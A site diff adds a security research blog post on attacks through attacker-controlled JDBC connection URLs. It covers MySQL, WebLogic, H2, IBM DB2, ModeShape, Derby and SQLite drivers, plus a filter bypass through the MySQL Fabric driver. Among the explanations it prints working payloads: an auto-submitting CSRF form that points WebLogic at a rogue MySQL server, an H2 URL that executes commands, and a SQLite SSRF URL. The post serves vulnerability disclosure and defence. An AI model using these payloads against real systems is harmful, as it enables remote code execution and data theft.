@@ -134,6 +134,239 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Make-JDBC-Attacks-Brillian-Again-I" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">Make JDBC Attacks Brilliant Again I</a>
+    </h1>
+  
+
+        
+        <a href="/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/" class="archive-article-date">
+  	<time datetime="2022-06-06T09:35:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h5 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h5><h5 id="0x02-JDBC-Introduction"><a href="#0x02-JDBC-Introduction" class="headerlink" title="0x02 JDBC Introduction"></a>0x02 JDBC Introduction</h5><p>The JDBC API is a Java API that can access any kind of tabular data, especially data stored in a relational database.</p>
+<p>JDBC helps you to write Java applications that manage these three programming activities:</p>
+<ul>
+<li>Connect to a data source, like a database</li>
+<li>Send queries and update statements to the database</li>
+<li>Retrieve and process the results received from the database in answer to your query</li>
+</ul>
+<p>Actually, JDBC is a set of standard interfaces and a particular relational database has its own implement,like <code>JDBCMysqlImpl</code> in MySQL JDBC driver.I draw the following picture to describe these implements.</p>
+<p><img src="/images/pasted-131.png" alt="upload successful"></p>
+<p>It is mainly in the <code>java.sql</code> package in JDK, JDBC drivers are client-side adapters , installed in the client endpoint, not in the server side. It can convert requests from Java programs to a protocol that the DBMS can understand.JDBC drivers provide JDBC specific implementations for different databases . For developers, JDBC helps shield the specifics of individual databases.</p>
+<p>The following simple code fragment gives an example.</p>
+<p><img src="/images/pasted-132.png" alt="upload successful"></p>
+<p>The short code fragment instantiates a DriverManager object to connect to a database driver and log into the database. It occured to me that if the JDBC URL is under control, what will take place?</p>
+<p>According to the above picture, the basic attack assumptive steps are as follow:</p>
+<ul>
+<li><p>Sets a malicious JDBC URL and triggers the JDBC connection. </p>
+</li>
+<li><p>As the client side, it connects to the malicious server which specified by the attacker with JDBC driver. </p>
+</li>
+<li><p>Take advantage of the security flaws or some particular properties of the JDBC drivers to trigger these vulnerabilities.</p>
+</li>
+</ul>
+<p>Before my new research, I focus on some disclosed cases.So starting with the in-depth analysis of the historical vulnerablities.</p>
+<h5 id="0x03-Review-Historical-Issues"><a href="#0x03-Review-Historical-Issues" class="headerlink" title="0x03 Review Historical Issues"></a>0x03 Review Historical Issues</h5><h6 id="MySQL-Client-Arbitrary-File-Reading-Vulnerability"><a href="#MySQL-Client-Arbitrary-File-Reading-Vulnerability" class="headerlink" title="MySQL Client Arbitrary File Reading Vulnerability"></a>MySQL Client Arbitrary File Reading Vulnerability</h6><p>This vulnerability is caused by the existed MySQL feature for a long time. The feature is that the Load Data Local Infile statement can read client files and send them to the server. There is no doubt that this feature is very risky, and the MySQL official document clearly states that clients should not connect to any untrusted server. </p>
+<p>But the truth is that it’s always hard to be sure. And since this is the specification of MySQL, it can affect most clients, including the MySQL JDBC driver. An attacker can forge a malicious MySQL server and after the client connects, the client will sends some initializing query packets such as send query to <code>SET NAMES</code> charset <code>utf-8</code>, then the malicious server can send a file transfer packet specifying to read any file from the client.</p>
+<p><img src="/images/pasted-133.png" alt="upload successful"></p>
+<h6 id="MySQL-JDBC-Client-Deserialization-Vulnerability"><a href="#MySQL-JDBC-Client-Deserialization-Vulnerability" class="headerlink" title="MySQL JDBC Client Deserialization Vulnerability"></a>MySQL JDBC Client Deserialization Vulnerability</h6><p>Actually the MySQL JDBC deserialization vulnerability was firstly mentioned by <code>Thijs Alkemade</code> in 2017. </p>
+<p><img src="/images/pasted-135.png" alt="upload successful"></p>
+<p>This report named <code>Unexpected automatic deserialisation of Java objects</code> was assinged as CVE-2017-3523 eventually.The details of the issue are as follows.</p>
+<p><a target="_blank" rel="noopener" href="https://www.computest.nl/advisories/CT-2017-0425_MySQL-Connector-J.txt">https://www.computest.nl/advisories/CT-2017-0425_MySQL-Connector-J.txt</a></p>
+<p>Until in 2019, some new research are disclosed by <code>ZhangYang</code> and his team mates. They made a presentation named <code>&lt;New Exploit Technique In Java Deserialization Attack&gt;</code> in Black Hat Europe.When MySQL JDBC directly deserializes certain types of data returned by the server, It can result in RCE if gadgets are appropriate.</p>
+<p><img src="/images/pasted-200.png" alt="upload successful"></p>
+<p>Using the <code>statementInterceptors</code> property provided by the JDBC driver, you can set an interceptor to perform additional operations before or after the certain kinds of statements.The full attacking chains are that</p>
+<p>Firstly, set the <code>statementInterceptor</code> attribute to <code>ServerStatusDiffInterceptor</code>, auditing <code>ServerStatusDiffInterceptor</code> code, you can see that this interceptor allows the client to send specific queries to the server, In addition, the <code>getObject</code> method is used to process the returned column. </p>
+<p><img src="/images/pasted-201.png" alt="upload successful"></p>
+<p>In the <code>getObject</code> method, the driver will directly call the <code>readObject</code> method for deserialization of binary and blob types. Therefore, the server side controlled by the attacker can trigger deserialization vulnerabilities as long as it returns falsified serialized data.</p>
+<p><img src="/images/pasted-202.png" alt="upload successful"></p>
+<p>Of course, the class and property names of interceptors are different in various version of JDBC driver as shown in the table.</p>
+<p><img src="/images/pasted-137.png" alt="upload successful"></p>
+<h6 id="Weblogic-RCE-involving-MySQL-JDBC-Deserialization"><a href="#Weblogic-RCE-involving-MySQL-JDBC-Deserialization" class="headerlink" title="Weblogic RCE involving MySQL JDBC Deserialization"></a>Weblogic RCE involving MySQL JDBC Deserialization</h6><p>I look for some real world scenarios of MySQL JDBC connection configuration. I suddenly realize that data source can be specified by user in Weblogic server console and MySQL JDBC driver is built-in.Consequently I can customize the JDBC URL with some particular properties. And then I analyze the Weblogic server source code to make sure that. Unfortunately, it needs the authorization. I hope to make it much more harmful, then I figure out there is no CSRF token check of <code>createJDBCDataSourceForm</code>.</p>
+<p><img src="/images/pasted-139.png" alt="upload successful"></p>
+<p>Eventually, I construct the PoC like this,</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form name =&quot;wls&quot; target=&quot;frame&quot; action=&quot;http://weblogic-server-ip:7001/console/console.portal?CreateGlobalJDBCDataSourcePortlet_actionOverride=/com/bea/console/actions/jdbc/datasources/createjdbcdatasource/testConnectionConfiguration&quot; method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortletdriverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;CreateGlobalJDBCDataSourcePortleturl&quot; value=&quot;jdbc:mysql://rogue-mysql-server-ip:3306/demo?user=root&amp;password=password&amp;characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot; /&gt;
+&lt;/form&gt;
+&lt;iframe name=&quot;frame&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;document.wls.submit()&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p>When the administrator clicks the link of the above HTML page, the remote code will executed. I reported the bugs to Oracle. Then CVE number are assigned as <code>CVE-2020-2869, CVE-2020-2934</code>.</p>
+<p><img src="/images/pasted-140.png" alt="upload successful"></p>
+<h6 id="SpringBoot-H2-Console-RCE-with-JDBC-Driver"><a href="#SpringBoot-H2-Console-RCE-with-JDBC-Driver" class="headerlink" title="SpringBoot H2 Console RCE with JDBC Driver"></a>SpringBoot H2 Console RCE with JDBC Driver</h6><p>When SpringBoot H2 database console is enabled, we can access the endpoit <code>/h2-console/</code> to administrate the H2 databse with a web page. </p>
+<p>However,the JDBC URL of H2 database is on supportive of the <code>INIT</code> parameter. It can be utilized to execute an initialization SQL sentence, meanwhile, an external SQL script can be imported by <code>RUNSCRIPT FROM</code>. </p>
+<p><img src="/images/pasted-141.png" alt="upload successful"></p>
+<p>Here is the illustration in SpringBoot H2 console</p>
+<p><img src="/images/pasted-142.png" alt="upload successful"></p>
+<p>First of all, we have to review the source code to figure out why we use the <code>RUNSCRIPT FROM</code> statement.</p>
+<p><img src="/images/pasted-143.png" alt="upload successful"></p>
+<p>During debugging the source code, we know that the <code>INIT</code> property is on supportive of executing any SQL statement, but you have to merge multiple SQL sentences into one. So we naturally choose <code>RUNSCRIPT FROM</code> key word to invoke a remote SQL script.</p>
+<p>Refer to the illustration, there is a disadvantage that a HTTP request is required with <code>RUNSCRIPT FROM</code> key word. Usually establishing a HTTP protocol request to the external network is forbbiden. </p>
+<p>After further testing, I find another way of using <code>\</code> to translate <code>;</code>. multiple sentences are merged into one, that meets all our requirements.</p>
+<pre><code>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\;return &quot;test&quot;\;&#125;&#39;\;CALL EXEC(&#39;open -a calculator&#39;)
+</code></pre>
+<p><img src="/images/pasted-145.png" alt="upload successful"></p>
+<p>Of course, we can use other sentences. The <code>CREATE ALIAS Function</code> key words are combined with an additional <code>CALL</code> key word in multiple SQL sentences, but they are both necessary in the same time. </p>
+<p>After more in-depth analyses of the source code. We find that the <code>JAVA METHOD</code> defined in <code>CREATE ALIAS AS</code> sentence is all handled by the method  <code>SourceCompiler</code>. It supports three kinds of processing logic, <code>Java</code>, <code>JavaScript</code> and <code>Groovy</code>, all of which are compiled in order to finally execute the <code>ALIAS</code> function. </p>
+<p><img src="/images/pasted-144.png" alt="upload successful"></p>
+<p>The <code>parseClass</code> of Groovy catches my eye and it occurs to me that <code>Orange Tsai</code> made a presentation named <code>&lt;Hacking Jenkins Part 2&gt;</code> in 2019. Is is about abusing meta programming. </p>
+<p>Here is the official introduction about the <code>@asttest</code> annotation.</p>
+<p><img src="/images/pasted-146.png" alt="upload successful"></p>
+<p>It is triggered by <code>parseClass</code> method.</p>
+<p><img src="/images/pasted-148.png" alt="upload successful"></p>
+<p>Finally we can execute malicious java code in assertions.</p>
+<p><img src="/images/pasted-147.png" alt="upload successful"></p>
+<p>However, in the real world, Groovy dependencies are not built into H2 database environment. So this attack depends on whether Groovy components are included into the application. Obviously it does not make sense.</p>
+<p>So we continue to look for another way to attack, reviewing the source code, we quickly discover that in addition to the <code>CREATE ALIAS AS</code>  sentence, there is another sentence can input a customized source code. </p>
+<p>In the parsing of the <code>CREATE Trigger</code> statement, finally, we can call <code>loadFromSource</code> method of the <code>TriggerObject</code> class. We are pleasantly surprised to find that in this method, the javascript source code is not only compiled but also executed. As the source code showing, it calls the <code>eval()</code> method directly. And since <code>ScriptEngine</code> is finally used for execution with no sandbox implement, we could input any java class fragment we wanted in javascript. So with this, we can easily achieve the purpose of RCE without the <code>CALL</code> or other sentences.</p>
+<p><img src="/images/pasted-161.png" alt="upload successful"></p>
+<p>As the PoC shows,JavaScript scripts start with JavaScript comments, and then we can then simply use <code>java.lang.Runtime.getRuntime().exec()</code> method to achieve RCE.</p>
+<p><img src="/images/pasted-162.png" alt="upload successful"></p>
+<h5 id="Jboss-Wildfly-Server-Console-RCE-with-JDBC-Driver"><a href="#Jboss-Wildfly-Server-Console-RCE-with-JDBC-Driver" class="headerlink" title="Jboss /Wildfly Server Console RCE with JDBC Driver"></a>Jboss /Wildfly Server Console RCE with JDBC Driver</h5><p>Here is another sample we use H2 database JDBC driver to execute remote  malicious code, you can refer to the <code>SpringBoot H2 RCE</code> sample.</p>
+<p><img src="/images/pasted-165.png" alt="upload successful"></p>
+<h6 id="IBM-DB2-RCE-with-JDBC-Driver"><a href="#IBM-DB2-RCE-with-JDBC-Driver" class="headerlink" title="IBM DB2 RCE with JDBC Driver"></a>IBM DB2 RCE with JDBC Driver</h6><p>After the above research, I realize some properties of JDBC driver could directly lead to vulnerablities.</p>
+<p>I read the official documents of IBM DB2 JDBC driver to search the potential suspicious properties. I noticed a property called <code>clientRerouteServerListJNDIName</code>, the official description as follows</p>
+<p><img src="/images/pasted-156.png" alt="upload successful"></p>
+<p>As described in the document, if the first connection to the data source fails, this property will provide an alternative server location.The <code>Lookup</code> method of the context is finally called for performing a JNDI lookup according to the source code fragment.</p>
+<p><img src="/images/pasted-158.png" alt="upload successful"></p>
+<p>So it is easy to imagine that if a malicious JNDI localtion is provided and the client fails to the connect the first localtion, then it will look up the second malicious JNDI localtion. Obviously,it is a well-known JNDI injection vulnerability.</p>
+<p><img src="/images/pasted-159.png" alt="upload successful"></p>
+<p>When the client connects to the malicious LDAP server, it will load the malicious java class from the remote codebase.Here is the final PoC</p>
+<p><img src="/images/pasted-160.png" alt="upload successful"></p>
+<h6 id="ModeShape-RCE-with-JDBC-Driver"><a href="#ModeShape-RCE-with-JDBC-Driver" class="headerlink" title="ModeShape RCE with JDBC Driver"></a>ModeShape RCE with JDBC Driver</h6><p><code>ModeShape</code> is a lightweight, fast, and pluggable JCR repository that federates and unifies content from multiple systems, including files systems, databases, configuration files, other repositories, services, applications, and data grids. </p>
+<p><img src="/images/pasted-152.png" alt="upload successful"></p>
+<p>The full name of JCR is Content Repository API for Java is a specification for a Java platform application programming interface API to access content repositories in a uniform manner.Using the JCR API, you can get data from a variety of different systems, including file systems, relational databases and so on.</p>
+<p><img src="/images/pasted-153.png" alt="upload successful"></p>
+<p>A standard JCR connection for ModeShape is in the format shown bellow, which requires <code>repositoryName</code> to make a connection to an existing repository. In this way, the JNDI string in the connection URL gets our attention, and we reasonably assume that in addition to supporting the JCR protocol, other protocols such as LDAP should also be supported. </p>
+<p><img src="/images/pasted-163.png" alt="upload successful"></p>
+<p>After futher testing, it turns out that we can indeed initiate a JNDI lookup request to a specified LDAP server, so this is another typical JNDI injection vulnerability.</p>
+<p><img src="/images/pasted-164.png" alt="upload successful"></p>
+<h6 id="Apache-Derby-with-JDBC-Driver"><a href="#Apache-Derby-with-JDBC-Driver" class="headerlink" title="Apache Derby with JDBC Driver"></a>Apache Derby with JDBC Driver</h6><p>Apache Derby is an open source relational database implemented entirely in java. It can be used as an embedded database just like H2 database. With embedded databases, it is usually easier to implement attacks because the server and client can exist in the same project. </p>
+<p>We find a suspicious java code fragment when we look for sensitive calls in the Apache Derby driver code.There is a <code>readMessage</code> method in the <code>SocketConnection</code> class. The <code>readObject</code> method is invoked directly, which is always used to deserialize input stream in java. This code fragment obviously exists a deserialization vulnerability. In fact, from a security code point of view, this <code>SocketConnection</code> class is suspicious. </p>
+<p><img src="/images/pasted-168.png" alt="upload successful"></p>
+<p>You can see from it’s construct method, it wraps a Socket, and wraps  socket outputstream and inputstream into Object OutputStream and ObjectInputStream.</p>
+<p>The readMessage method semms to reads and parses the Socket inputstream. If we can communicate with the wrapped Socket, then we will probably be able to trigger the deserialization vulnerability. So we go back to the invocation chains and see how to call the <code>readMessage</code> method.</p>
+<p>We find that the caller is the inner class <code>MasterReceiverThread</code> of <code>ReplicationMessageTransmit</code> class.</p>
+<p><img src="/images/pasted-169.png" alt="upload successful"></p>
+<p>As you can guess from the class names and package names, these code snippets relate to Derby’s ability to replicate databases. I go through the Derby documentation section on replicating databases and know that database replication can be initiated with JDBC connection property, which is exactly what we need. Also the connection property is controllable.</p>
+<p>In fact, if you go all the way up the call chain, you can see that whether this Thread is started depends on whether the <code>startMaster</code> property is enabled. As the code showing, <code>isStartReplicationMasterBoot</code> method used for judgment. And in the code ,we can find that we can specify which host the socket connect to by controlling the <code>slaveHost</code> property. So we can set the <code>startMaster</code> property as <code>true</code> and the <code>slaveHost</code> property to the malicious server, then Apache Derby will try to connect to the malicious slave server and communicate with echo other. At this point, the responsed malicious serialization data steam will be automatically deserialized, thus achieving the RCE purpose. </p>
+<p>Malicious connection demo as shown in the code</p>
+<p>And the malicious Slave Sever code is as follows,It is very simple. The malicious Slave Sever can return  serialized data  directly after the connection is received.</p>
+<h5 id="SQLite-RCE-with-JDBC-Driver"><a href="#SQLite-RCE-with-JDBC-Driver" class="headerlink" title="SQLite RCE with JDBC Driver"></a>SQLite RCE with JDBC Driver</h5><p>SQLite is also a lightweight embedded database. </p>
+<p><img src="/images/pasted-170.png" alt="upload successful"></p>
+<p>we review the code for its connection and find that when the JDBC URL is controllable, then we can customize its <code>resourceName</code> in the <code>open</code> method as follows </p>
+<p><img src="/images/pasted-181.png" alt="upload successful"></p>
+<p>Stepping into the <code>extractResource</code> method, we can see that the URL  constructed by <code>resourceName</code> calls <code>openStream</code> method , so this can be used to achieve the SSRF attack as follow,</p>
+<pre><code>jdbc:sqlite::resource:http://127.0.0.1:8888/poc1.db
+</code></pre>
+<p>Send an HTTP request to specific ip address with JDBC connection. However, SSRF attack is not stratified our purpose. </p>
+<p><img src="/images/pasted-172.png" alt="upload successful"></p>
+<p>Using sqLite’s Resource subprotocol, you can connect to the specified IP to download specific database files, that is, if the JDBC URL is under our control, we can control the database files that client open.</p>
+<p>So, Based on that, how should we attack? </p>
+<p>Referring to &lt;SELECT code_execution FROM * USING SQLite&gt; which descripts how to gain code execution using a malicious SQLite database. We can consider a scenario that there is a controllable  JDBC URL and an uncontrollable <code>SELECT</code> statement. </p>
+<p>A brief code is shown in the figure. The URL is controllable, but the SQL statement executed  are not controllable. </p>
+<p>In the controllable database file, there is a <code>Data Definition Languae (DDL)</code> statements used to <code>CREATE TABLE</code> or <code>VIEW</code>. The DDL statements actually appear as a plain text.</p>
+<p>if we inspect that the uncontrollable statement is SELECT * from hitb table, we can CREATE VIEW names hitb to hijack the SELECT statement to execute a subquery defined in the CREATE VIEW DDL. In this way, we can transform the SQL statement that we cannot control into the query statement that we can control. </p>
+<p>The next step, if we have a controllable JDBC URL connection, we can open the <code>load_extension</code> option in SQLite. So if we have a controlled file, we can archive RCE purpose by loading this extension. In fact, the extension is a <code>Dynamic Link Library</code> or <code>Shared Object</code>. In <code>SELECT</code> statement, <code>load_extension</code> function can load a <code>.ddl</code> or <code>.so</code> file and execute <code>sqlite3_extension_init</code> function in it. So input the malicious code in <code>sqlite3_extension_init</code> function can trigger the remote code excution.</p>
+<p><img src="/images/pasted-178.png" alt="upload successful"></p>
+<p><img src="/images/pasted-177.png" alt="upload successful"></p>
+<p>Actually getting a manageable file is not always easy. Since Sqlite often bursts memory corruptions vulnerabilities, we can use these memory corruptions to attack. As shown in the code bellow, we can use <code>Magellan</code> PoC to create a local SQLite database with a malicious security <code>VIEW</code>.</p>
+<p><img src="/images/pasted-179.png" alt="upload successful"></p>
+<p>The Magellan is a number of vulnerabilities that exist in SQLite caused by memory corruptions.Specify a JDBC connection to download our database file and open it. When the code executes to query for security table, it will trigger a JVM crash.</p>
+<p><img src="/images/pasted-180.png" alt="upload successful"></p>
+<p>But</p>
+<h5 id="Open-Source-Project-JDBC-Attack-Defense-Policy"><a href="#Open-Source-Project-JDBC-Attack-Defense-Policy" class="headerlink" title="Open Source Project JDBC Attack Defense Policy"></a>Open Source Project JDBC Attack Defense Policy</h5><p>According to the previous attack methods, we can find that vulnerabilities usually appear in some special JDBC properties. So some open source projects take the method of filtering sensitive properties to fix such vulnerabilities. <code>Apache Druid</code> as well as <code>Apache DolphinScheduler</code> have been exposed to MySQL JDBC deserialization vulnerabilities in the past, so we focus on the two open source softwares . The CVE numbers for the two vulnerabilities are <code>CVE-2021-26919</code> and <code>CVE-2020-11974</code>.</p>
+<p><code>Apache Druid</code> defines a whitelist of properties. Only the properties in the whitelist are permitted.</p>
+<p><img src="/images/pasted-184.png" alt="upload successful"></p>
+<p>Otherwise, <code>Apache DolphinScheduler</code> removes sensitive properties from parameters. </p>
+<p><img src="/images/pasted-185.png" alt="upload successful"></p>
+<ul>
+<li>Is there a new exploitable way to bypass property filter?</li>
+</ul>
+<p>We choose <code>Apache Druid</code>, which uses the <code>MySQL-connector-5.1.48</code> as our target. For this fix, the first idea is to see if the filter parameters method is consistent with the JDBC connection processing parameters method. </p>
+<p><img src="/images/pasted-187.png" alt="upload successful"></p>
+<p>You can see in the <code>Apache Druid</code> source code that the filter use the MySQL connector default parse URL method.By default they are consistent. </p>
+<p><img src="/images/pasted-188.png" alt="upload successful"></p>
+<p>Therefore, we jump out of this idea and take a look at the overall JDBC Driver loading logic.</p>
+<p>For the loading of JDBC Driver, they use SPI technology.full name is  Java Service Provider Interface. For JDBC, all registered drivers are stored in the <code>java.sql.Driver</code>.In 5.1.48 versions of MySQL connector ,there are two registerd drivers, one is the common JDBC driver, the other is <code>FabricMySQLDriver</code>.</p>
+<p><img src="/images/pasted-189.png" alt="upload successful"></p>
+<p>This <code>FabricMySQLDriver</code> has caught our attention. Refer to the MySQL driver documentation, you can see that <code>FabricMySQLDriver</code> is used to connect to the MySQL Fabric System. MySQL Fabric is a system for managing a farm of MySQL servers. </p>
+<p><img src="/images/pasted-190.png" alt="upload successful"></p>
+<p>We start researching in the source code of <code>FabricMySQLDriver</code>.If you pass in a URL that starts with the format as the code showing, it goes into the <code>Fabric Driver</code> processing logic. </p>
+<p><img src="/images/pasted-192.png" alt="upload successful"></p>
+<p>You can see that in the code the connection URL is concated by the <code>FabricProtocol</code>, <code>Host</code> and <code>Port</code> parameters. Trace the FabricProtocol parameter,We can  find that it is default to HTTP protocol . Enter the FabricConnection method, In this case, you can see that it uses the XMLRPC Client.</p>
+<p><img src="/images/pasted-193.png" alt="upload successful"></p>
+<p>Continuing to step into it, we find that it finally makes an XMLRPC call in the <code>errorSafeCall</code> Method and we can specify  host and port of this call. </p>
+<p><img src="/images/pasted-194.png" alt="upload successful"></p>
+<p>So it looks like we’ve got an SSRF vulnerability, but it’s not enough. Similar to the MySQL deserialization vulnerability, we go on seeing if the Fabric MySQL driver had made any errors during processing the revieved data.</p>
+<p><img src="/images/pasted-195.png" alt="upload successful"></p>
+<p>It is clearly visible in the code that it use the <code>newSAXParser</code> method of the <code>SAXParserFactory</code> directly to get a <code>SAXParser</code>, where the <code>SAXParserFactory</code> does not set any security attributes, is an obvious XXE vulnerability, which finally can cause an arbitity file reading or SSRF attack.</p>
+<p><img src="/images/pasted-196.png" alt="upload successful"></p>
+<p>So the idea of attack is very clear. We construct a specific JDBC URL to enter the processing logic of <code>Farbic Driver</code>, set the <code>Host</code> and <code>Port</code> in the JDBC URL to our malicious HTTP server and when the client establishes a connection, it will send an XMLRPC request to the server. We control the HTTP server to return a malicious XML document ,and then XXE vulnerability will be triggered when the client processes this XML Documnet. We can read the corresponding files from the client by using the out-of-band XML External Entity attack.</p>
+<p>The connection code of the client is shown in the figure. We can trigger the XXE vulnerability without any parameters. </p>
+<p><img src="/images/pasted-197.png" alt="upload successful"></p>
+<p>The malicious HTTP service code is shown as follows.To constrocut the mailicious XML Documnet is easy.</p>
+<p><img src="/images/pasted-198.png" alt="upload successful"></p>
+<h5 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h5><p>We have researched on JDBC attacks of the diverse main stream databases for a couple of weeks.Making the JDBC URLs customized will carry a big risk.It is recommended that if you have to make JDBC URLs customized, you should  strictly restrict the JDBC URLs either properties or protocols.</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">show more >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Make-JDBC-Attacks-Brilliant-Again" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
